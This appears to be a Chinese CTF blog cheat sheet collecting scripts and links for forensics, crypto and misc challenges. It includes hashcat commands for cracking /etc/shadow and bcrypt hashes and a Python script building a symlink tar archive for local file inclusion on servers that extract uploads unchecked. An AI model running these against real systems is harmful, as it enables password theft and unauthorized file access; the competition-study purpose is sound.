<p>字典爆破linux &#x2F;etc&#x2F;shadow的hash： <a target="_blank" rel="noopener" href="https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/">https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/</a></p>
<ul>
<li><code>hashcat -m 500 -a 0 -o cracked.txt hashes.txt ./rockyou.txt -O</code><br>其他爆破案例：</li>
<li><code>hashcat -m 3200 -a 0 dict.txt hash.txt</code>：爆破bcrypt hash</li>
<li><code>hashcat --potfile-disable -a 3 -m 500 hash.txt -d 1</code>:爆破linux <code>/etc/shadow</code>密码hash</li>
</ul>
<h2 id="Extracting-GPS-Coordinates-from-metadata"><a href="#Extracting-GPS-Coordinates-from-metadata" class="headerlink" title="Extracting GPS Coordinates from metadata"></a>Extracting GPS Coordinates from metadata</h2><p><a target="_blank" rel="noopener" href="https://github.com/BYU-CSA/BYUCTF-2023/tree/main/lost">https://github.com/BYU-CSA/BYUCTF-2023/tree/main/lost</a></p>
<h2 id="利用numba和multiprocessing库加速爆破"><a href="#利用numba和multiprocessing库加速爆破" class="headerlink" title="利用numba和multiprocessing库加速爆破"></a>利用<a target="_blank" rel="noopener" href="http://zhaoxuhui.top/blog/2019/01/17/PythonNumba.html">numba</a>和multiprocessing库加速爆破</h2><p>感觉任何任务量较大的爆破题都可以像这题的脚本一样，一个线程爆破一个部分，同时numba提高代码执行效率。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/TJCSec/tjctf-2023-challenges/tree/main/crypto/aluminum-isopropoxide">aluminum-isopropoxide</a></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> numba <span class="keyword">import</span> jit</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line"><span class="meta">@jit(<span class="params">nopython=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">idx</span>):</span><br><span class="line">    f = <span class="string">b&#x27;l\x90C\x99e\x19\x03Br\x02\xd2\x98@\xf8\xe8deWOvv\x16[G&#125;GA\\\xd2rv`\x16\x18&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> key_ <span class="keyword">in</span> <span class="built_in">range</span>(idx, idx + <span class="number">2</span>**<span class="number">31</span>//<span class="number">15</span>):</span><br><span class="line">        S_box = ...</span><br><span class="line">        key_ = <span class="built_in">str</span>(key_)</span><br><span class="line">        S = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">            S[i] = i</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">            j = (j ^ S[i] ^ <span class="built_in">ord</span>(key_[i % <span class="built_in">len</span>(key_)])) % <span class="number">256</span></span><br><span class="line">            S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">        amount = <span class="built_in">len</span>(f)</span><br><span class="line">        enc = f</span><br><span class="line"></span><br><span class="line">        i = j = <span class="number">0</span></span><br><span class="line">        ctr = <span class="number">0</span></span><br><span class="line">        out = []</span><br><span class="line">        <span class="keyword">while</span> ctr &lt; amount:</span><br><span class="line">            i = (i * j) % <span class="number">256</span></span><br><span class="line">            j = (i + S[j]) % <span class="number">256</span></span><br><span class="line">            K = (S[i] &amp; S[j])</span><br><span class="line">            out.append(enc[ctr] ^ S_box[K])</span><br><span class="line">            ctr += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        dec = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> out <span class="keyword">if</span> <span class="built_in">chr</span>(i) <span class="keyword">in</span> <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234566789&#125;_&#123;&quot;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(dec) == <span class="built_in">len</span>(f):</span><br><span class="line">            <span class="built_in">print</span>(dec)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    idx = [<span class="number">0</span>,<span class="number">2</span>**<span class="number">31</span>//<span class="number">15</span>,<span class="number">2</span>**<span class="number">31</span>//<span class="number">15</span> * <span class="number">2</span>,<span class="number">2</span>**<span class="number">31</span>//<span class="number">15</span> * <span class="number">3</span>,<span class="number">2</span>**<span class="number">31</span>//<span class="number">15</span> * <span class="number">4</span>,<span class="number">2</span>**<span class="number">31</span>//<span class="number">15</span> * <span class="number">5</span>,<span class="number">2</span>**<span class="number">31</span>//<span class="number">15</span> * <span class="number">6</span>,<span class="number">2</span>**<span class="number">31</span>//<span class="number">15</span> * <span class="number">7</span>,<span class="number">2</span>**<span class="number">31</span>//<span class="number">15</span> * <span class="number">8</span>,<span class="number">2</span>**<span class="number">31</span>//<span class="number">15</span> * <span class="number">9</span>,<span class="number">2</span>**<span class="number">31</span>//<span class="number">15</span> * <span class="number">10</span>,<span class="number">2</span>**<span class="number">31</span>//<span class="number">15</span> * <span class="number">11</span>,<span class="number">2</span>**<span class="number">31</span>//<span class="number">15</span> * <span class="number">12</span>,<span class="number">2</span>**<span class="number">31</span>//<span class="number">15</span> * <span class="number">13</span>,<span class="number">2</span>**<span class="number">31</span>//<span class="number">15</span> * <span class="number">14</span>]</span><br><span class="line">    pool = Pool(<span class="number">15</span>)</span><br><span class="line">    <span class="keyword">with</span> pool:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> pool.imap_unordered(main, idx):</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>

<h2 id="python保存gif图片的每一帧"><a href="#python保存gif图片的每一帧" class="headerlink" title="python保存gif图片的每一帧"></a>python保存gif图片的每一帧</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageSequence</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_frames</span>(<span class="params">image_path</span>):</span><br><span class="line">    <span class="keyword">with</span> Image.<span class="built_in">open</span>(image_path) <span class="keyword">as</span> im:</span><br><span class="line">        <span class="keyword">for</span> i, frame <span class="keyword">in</span> <span class="built_in">enumerate</span>(ImageSequence.Iterator(im)):</span><br><span class="line">            frame.save(<span class="string">f&#x27;frames/frame_<span class="subst">&#123;i&#125;</span>.png&#x27;</span>, <span class="string">&#x27;PNG&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="python-tarfile使用"><a href="#python-tarfile使用" class="headerlink" title="python tarfile使用"></a>python tarfile使用</h2><p>tar.extractall支持symbolic link，只检查文件的名称是不够的，服务端不做过滤就解压可能出现LFI</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">with</span> tarfile.<span class="built_in">open</span>(<span class="string">&#x27;exploit.tar.gz&#x27;</span>, <span class="string">&#x27;w:gz&#x27;</span>) <span class="keyword">as</span> tar:</span><br><span class="line">    <span class="comment"># First file</span></span><br><span class="line">    info1 = tarfile.TarInfo(<span class="string">&quot;test&quot;</span>)</span><br><span class="line">    info1.<span class="built_in">type</span> = tarfile.SYMTYPE</span><br><span class="line">    info1.linkname = <span class="string">&quot;/&quot;</span> </span><br><span class="line">    tar.addfile(info1)</span><br><span class="line">    <span class="comment"># Second file</span></span><br><span class="line">    info2 = tarfile.TarInfo(<span class="string">&quot;./test/name&quot;</span>) <span class="comment">#若服务端指定不能以绝对路径/开头，可以这样绕过</span></span><br><span class="line">    info2.<span class="built_in">type</span> = tarfile.SYMTYPE</span><br><span class="line">    info2.linkname = <span class="string">&quot;linkname&quot;</span></span><br><span class="line">    tar.addfile(info2)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">The TarInfo class in the tarfile module is used to represent information about a file or directory in a tar archive. It provides attributes and methods to set and retrieve various properties of the file or directory.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Here are some key attributes of the TarInfo class:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">name: The name of the file or directory. This can be an absolute or relative path.</span></span><br><span class="line"><span class="string">size: The size of the file in bytes. For directories, this is set to 0.</span></span><br><span class="line"><span class="string">mtime: The modification time of the file or directory, represented as a Unix timestamp.</span></span><br><span class="line"><span class="string">type: The type of the file or directory. This can be one of the following constants defined in the tarfile module: tarfile.REGTYPE (regular file), tarfile.DIRTYPE (directory), tarfile.LNKTYPE (hard link), tarfile.SYMTYPE (symbolic link), tarfile.CHRTYPE (character special file), tarfile.BLKTYPE (block special file), tarfile.FIFOTYPE (FIFO special file), or tarfile.CONTTYPE (contiguous file).</span></span><br><span class="line"><span class="string">linkname: The target of a hard link or symbolic link.</span></span><br><span class="line"><span class="string">uid: The user ID of the owner of the file or directory.</span></span><br><span class="line"><span class="string">gid: The group ID of the owner of the file or directory.</span></span><br><span class="line"><span class="string">mode: The permissions of the file or directory, represented as an octal number.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="描绘纯色背景GIF中的单一物品的轨迹"><a href="#描绘纯色背景GIF中的单一物品的轨迹" class="headerlink" title="描绘纯色背景GIF中的单一物品的轨迹"></a>描绘纯色背景GIF中的单一物品的轨迹</h2><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/D13David/ctf-writeups/tree/main/tenablectf23/stego/ancient_scrawls">https://github.com/D13David/ctf-writeups/tree/main/tenablectf23/stego/ancient_scrawls</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/ITSEC-ASIA-ID/Competitions/tree/main/CTF/2023/TenableCTF/Steganography/Ancient%20Scrawls">https://github.com/ITSEC-ASIA-ID/Competitions/tree/main/CTF/2023/TenableCTF/Steganography/Ancient%20Scrawls</a></li>
</ul>
<h2 id="Mac-M1安装Ghidra"><a href="#Mac-M1安装Ghidra" class="headerlink" title="Mac M1安装Ghidra"></a>Mac M1安装Ghidra</h2><ol>
<li>去 <a target="_blank" rel="noopener" href="https://github.com/NationalSecurityAgency/ghidra">https://github.com/NationalSecurityAgency/ghidra</a> 下载最新版本ghidra</li>
<li>去 <a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/downloads/">https://www.oracle.com/java/technologies/downloads/</a> 下载要安装的ghidra版本的最低需求jdk</li>
<li>运行ghidraRun。若要求输入jdk路径，输入jdk安装路径&#x2F;Contents&#x2F;Home</li>
</ol>
<h2 id="C语言signal号表"><a href="#C语言signal号表" class="headerlink" title="C语言signal号表"></a>C语言signal号表</h2><p><a target="_blank" rel="noopener" href="https://www-uxsup.csx.cam.ac.uk/courses/moved.Building/signals.pdf">https://www-uxsup.csx.cam.ac.uk/courses/moved.Building/signals.pdf</a></p>
<h2 id="JS下载文件"><a href="#JS下载文件" class="headerlink" title="JS下载文件"></a>JS下载文件</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sleep</span>(<span class="params">ms</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">setTimeout</span>(resolve, ms));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">download</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">        <span class="title function_">fetch</span>(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">blob</span>())</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function"><span class="params">blob</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> downloadLink = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">            downloadLink.<span class="property">href</span> = <span class="variable constant_">URL</span>.<span class="title function_">createObjectURL</span>(blob);</span><br><span class="line">            downloadLink.<span class="property">download</span> = <span class="string">&#x27;filename&#x27;</span>;</span><br><span class="line">            downloadLink.<span class="title function_">click</span>();</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">500</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="python获取wav文件频率"><a href="#python获取wav文件频率" class="headerlink" title="python获取wav文件频率"></a>python获取wav文件频率</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> scipy.io.wavfile <span class="keyword">as</span> wav</span><br><span class="line">ans=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    sample_rate, audio_data = wav.read(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    fft_data = np.fft.fft(audio_data)</span><br><span class="line">    frequencies = np.fft.fftfreq(<span class="built_in">len</span>(fft_data), <span class="number">1</span>/sample_rate)</span><br><span class="line">    positive_frequencies = frequencies[:<span class="built_in">len</span>(frequencies)//<span class="number">2</span>]</span><br><span class="line">    magnitude_spectrum = np.<span class="built_in">abs</span>(fft_data[:<span class="built_in">len</span>(fft_data)//<span class="number">2</span>])</span><br><span class="line">    max_index = np.argmax(magnitude_spectrum)</span><br><span class="line">    max_frequency = positive_frequencies[max_index]</span><br><span class="line">    ans.append(<span class="built_in">str</span>(max_frequency)[:-<span class="number">2</span>])</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br></pre></td></tr></table></figure>

<h2 id="使用Filebin-api"><a href="#使用Filebin-api" class="headerlink" title="使用Filebin api"></a>使用Filebin api</h2><p>这样就能在linux终端上传文件了。去 <a target="_blank" rel="noopener" href="https://filebin.net/api">https://filebin.net/api</a> ，点击upload a file to a bin,点击Try it out，填写bin名（这个访问 <a target="_blank" rel="noopener" href="https://filebin.net/">https://filebin.net/</a> 就能得到一个名字）和上传的文件名。然后选择文件（随便一个即可），点击execute。如果成功，就可以copy curl命令到终端上。大概是这样：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -X <span class="string">&#x27;POST&#x27;</span> \</span><br><span class="line">  <span class="string">&#x27;https://filebin.net/binname/filename&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;accept: application/json&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;Content-Type: application/octet-stream&#x27;</span> \</span><br><span class="line">  --data-binary <span class="string">&#x27;@path/to/file&#x27;</span></span><br></pre></td></tr></table></figure>

<p>上传成功后get<code>https://filebin.net/binname/filename</code>即可。今天用的时候发现服务器满了传不了文件，我又找了另一个api通用的filebin： <a target="_blank" rel="noopener" href="https://arquivos-saude.recife.pe.gov.br/">https://arquivos-saude.recife.pe.gov.br/</a></p>
<p>今天发现两个好像都down了……找了个替代的： <a target="_blank" rel="noopener" href="https://www.file.io/">https://www.file.io/</a> 。这个的api稍微难用点，但是模板如下：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl -X <span class="string">&#x27;POST&#x27;</span> \</span><br><span class="line">  <span class="string">&#x27;https://file.io/&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;accept: application/json&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;Content-Type: multipart/form-data&#x27;</span> \</span><br><span class="line">  -F <span class="string">&#x27;file=@path/to/file&#x27;</span> \</span><br><span class="line">  -F <span class="string">&#x27;expires=ISO 8601 date string&#x27;</span> \</span><br><span class="line">  -F <span class="string">&#x27;maxDownloads=1&#x27;</span> \</span><br><span class="line">  -F <span class="string">&#x27;autoDelete=true&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这个ISO 8601 date string可以在 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date/toISOString">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date/toISOString</a> 运行代码得到</p>
<h2 id="SMC文件解码"><a href="#SMC文件解码" class="headerlink" title="SMC文件解码"></a>SMC文件解码</h2><p>适用于简单的smc</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;SMC&quot;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    file=f.read()</span><br><span class="line">offset= <span class="comment">#smc code出现的偏移</span></span><br><span class="line">length= <span class="comment">#smc code段的长度</span></span><br><span class="line">obfuscated=file[offset:offset+length]</span><br><span class="line">res=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> obfuscated: <span class="comment">#这块为具体的解码逻辑，可以比这里更复杂</span></span><br><span class="line">    res.append(i^<span class="number">0x66</span>)</span><br><span class="line">res=<span class="built_in">bytes</span>(res)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/SMC_out&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(file[:offset]+res+file[offset+length:]) <span class="comment">#重新拼接回去</span></span><br></pre></td></tr></table></figure>

<h2 id="python获取wav文件的频率"><a href="#python获取wav文件的频率" class="headerlink" title="python获取wav文件的频率"></a>python获取wav文件的频率</h2><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/4n86rakam1/writeup/tree/main/SunshineCTF_2023/scripting/SimonProgrammer_3">SimonProgrammer 3</a></li>
<li><a target="_blank" rel="noopener" href="https://gist.github.com/c0nrad/66a322ca0e1b0ffc4261e2a9ed6b1f93">https://gist.github.com/c0nrad/66a322ca0e1b0ffc4261e2a9ed6b1f93</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Amagnum/Music-notes-detection/blob/master/music_notes_detection.py">https://github.com/Amagnum/Music-notes-detection/blob/master/music_notes_detection.py</a></li>
</ul>
<h2 id="python恢复shifted-image"><a href="#python恢复shifted-image" class="headerlink" title="python恢复shifted image"></a>python恢复shifted image</h2><p>shifted image看起来倾斜，像是被拉伸了一样</p>
<p><a target="_blank" rel="noopener" href="https://berliangabriel.github.io/post/tcp1p-ctf-2023/">https://berliangabriel.github.io/post/tcp1p-ctf-2023/</a></p>
<h2 id="Git使用"><a href="#Git使用" class="headerlink" title="Git使用"></a>Git使用</h2><ul>
<li>如何设置commit时的username： <a target="_blank" rel="noopener" href="https://docs.github.com/en/get-started/getting-started-with-git/setting-your-username-in-git">https://docs.github.com/en/get-started/getting-started-with-git/setting-your-username-in-git</a> 。同理，设置邮箱可用<code>git config --global user.email &quot;email&quot;</code></li>
</ul>
<h2 id="如何将wav文件转为standard-IQ-file"><a href="#如何将wav文件转为standard-IQ-file" class="headerlink" title="如何将wav文件转为standard IQ file"></a>如何将wav文件转为standard IQ file</h2><p><a target="_blank" rel="noopener" href="https://blog.nanax.fr/post/2024-01-28-hardware-longrange2/">https://blog.nanax.fr/post/2024-01-28-hardware-longrange2/</a></p>
<h2 id="A-Block-and-a-Hard-Place"><a href="#A-Block-and-a-Hard-Place" class="headerlink" title="A Block and a Hard Place"></a><a target="_blank" rel="noopener" href="https://ctf.krauq.com/bi0sctf-2024">A Block and a Hard Place</a></h2><p>用户可以控制角色在有障碍的地图里走动，要求在事先不知道地图的情况下通过行走时的反馈描绘出地图</p>
<h2 id="Brainf-ck-Search"><a href="#Brainf-ck-Search" class="headerlink" title="Brainf*ck Search"></a><a target="_blank" rel="noopener" href="https://blog.bi0s.in/2024/02/26/Misc/BFS-BrainfuckSearch-bi0sctf2024/">Brainf*ck Search</a></h2><p>brainfuck code golfing挑战，使用有限的代码在tape中寻找flag子节。其他wp： <a target="_blank" rel="noopener" href="https://www.writeup.no/posts/bi0s-24-misc-brainfuck/">https://www.writeup.no/posts/bi0s-24-misc-brainfuck/</a></p>
<h2 id="Maize"><a href="#Maize" class="headerlink" title="Maize"></a><a target="_blank" rel="noopener" href="https://github.com/WolvSec/WolvCTF-2024-Challenges-Public/tree/master/rev/maize">Maize</a></h2><p>立体方块迷宫求解器</p>
<h2 id="rockyoudle"><a href="#rockyoudle" class="headerlink" title="rockyoudle"></a><a target="_blank" rel="noopener" href="https://gist.github.com/C0nstellati0n/78f5887b5bee235583a026840354ae54#rockyoudle">rockyoudle</a></h2><p>wordle求解器</p>
<h2 id="Mysterious-Melody"><a href="#Mysterious-Melody" class="headerlink" title="Mysterious Melody"></a><a target="_blank" rel="noopener" href="https://ctf.krauq.com/bcactf-2024">Mysterious Melody</a></h2><p>python获取midi文件的音符</p>
<p>使用audacity的手动做法： <a target="_blank" rel="noopener" href="https://github.com/BCACTF/bcactf-5.0/blob/main/mysterious-melody">https://github.com/BCACTF/bcactf-5.0/blob/main/mysterious-melody</a></p>
<h2 id="Touch-Tone-Telephone"><a href="#Touch-Tone-Telephone" class="headerlink" title="Touch Tone Telephone"></a><a target="_blank" rel="noopener" href="https://ctf.krauq.com/bcactf-2024">Touch Tone Telephone</a></h2><p>python解码dtmf wav脚本</p>
<p>题目官方的rust脚本： <a target="_blank" rel="noopener" href="https://github.com/BCACTF/bcactf-5.0/blob/main/touch-tone-telephone">https://github.com/BCACTF/bcactf-5.0/blob/main/touch-tone-telephone</a></p>
<h2 id="Picoify"><a href="#Picoify" class="headerlink" title="Picoify"></a><a target="_blank" rel="noopener" href="https://github.com/TFNS/writeups/tree/master/2024-06-30-UIUCTF/picoify">Picoify</a></h2><p>编写能在Microchip PIC16F628A上运行的压缩代码。特别之处在于，这玩意SRAM才224字节，甚至没法把要压缩的内容一股脑读进来，因此这里实现的是streaming compression。另外，PIC16 assembly code可以参考wp里的方式生成，先写个C代码再用<a target="_blank" rel="noopener" href="https://www.microchip.com/en-us/tools-resources/develop/mplab-xc-compilers">编译器</a>编译。这块最后实现的算法是huffman，并用python代码实现解压</p>
<p><a target="_blank" rel="noopener" href="https://maplebacon.org/2024/07/uiuctf-picoify/">https://maplebacon.org/2024/07/uiuctf-picoify/</a> 是另一种解法。作者直接根据压缩的内容发明了一个压缩算法。不过还是学到了很多东西：</p>
<ul>
<li>如何计算文本的entropy</li>
<li>使用<a target="_blank" rel="noopener" href="https://www.gnu.org/software/gperf/">gperf</a>生成完美哈希表</li>
<li>python内部会使用sbrk系统调用为常数量分配空间。如果sbrk被禁而且非要往里面塞大型变量的话，可以利用注释将内容“走私”进去，然后运行时访问程序的源代码将内容拿出来</li>
<li>清理sys.argv可以获得一部分内存（取决于原本sys.argv的大小）</li>
</ul>
<h1 id="WebSocket-VPN"><a href="#WebSocket-VPN" class="headerlink" title="WebSocket VPN"></a><a target="_blank" rel="noopener" href="https://ouuan.moe/post/2024/07/ductf-2024">WebSocket VPN</a></h1><p>通过websocket发送TCP握手IP报文和HTTP请求</p>
<h1 id="sleepy-alarm"><a href="#sleepy-alarm" class="headerlink" title="sleepy-alarm"></a><a target="_blank" rel="noopener" href="https://yun.ng/c/ctf/2024-ictf/forensics/sleepy-alarm">sleepy-alarm</a></h1><ul>
<li>使用audacity+python分析音频。有时候audacity里结果不清楚，在python里将相同的操作重复一遍再plot出来就清楚了</li>
<li>应用band pass noise reduction过滤某个频率出的噪音</li>
<li>另一种按时间间隔读取bit的做法： <a target="_blank" rel="noopener" href="https://gist.github.com/C0nstellati0n/78f5887b5bee235583a026840354ae54#sleepy-alarm">https://gist.github.com/C0nstellati0n/78f5887b5bee235583a026840354ae54#sleepy-alarm</a></li>
</ul>
<h1 id="left-in-the-dark"><a href="#left-in-the-dark" class="headerlink" title="left-in-the-dark"></a><a target="_blank" rel="noopener" href="https://yun.ng/c/ctf/2024-ictf/misc/left-in-the-dark">left-in-the-dark</a></h1><p>升级版A*迷宫寻路算法，无法提前得知迷宫地图，需要一边走一边探索路线，走错路后还需要重新规划路线并回退之前的操作</p>
<h1 id="MAN-in-the-middle"><a href="#MAN-in-the-middle" class="headerlink" title="MAN in the middle"></a><a target="_blank" rel="noopener" href="https://yun.ng/c/ctf/2024-deadsec-ctf/misc/man-in-the-middle">MAN in the middle</a></h1><p>解码曼彻斯特(Manchester)编码信号wav</p>
<h2 id="其他类型"><a href="#其他类型" class="headerlink" title="其他类型"></a>其他类型</h2><ul>
<li>小端下将bytes转为数字：<code>int.from_bytes(msg, &#39;little&#39;)</code>。类似地，大端填<code>&#39;big&#39;</code></li>
<li>pwntools将内存&#x2F;数字转为浮点数形式： <a target="_blank" rel="noopener" href="https://7rocky.github.io/en/ctf/other/htb-unictf/zombienator/">https://7rocky.github.io/en/ctf/other/htb-unictf/zombienator/</a> ，程序scanf用<code>%lf</code>时用</li>
<li><a target="_blank" rel="noopener" href="https://github.com/DvorakDwarf/Infinite-Storage-Glitch">Infinite-Storage-Glitch</a><ul>
<li>youtube不限制上传的视频数量，所以只要把文件转成视频，就有了无限的存储……</li>
</ul>
</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://theganlove.github.io/2024/09/01/%E8%84%9A%E6%9C%AC%E5%B7%A5%E5%85%B7/" data-id="cm0kx5k5l001xo8dkbj700ggq" data-title="脚本工具" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2024/09/01/%E9%9A%90%E5%86%99%E7%B3%BB%E5%88%97/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          隐写系列
        
      </div>
    </a>
  
  
    <a href="/2024/09/01/ssrf/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">ssrf</div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
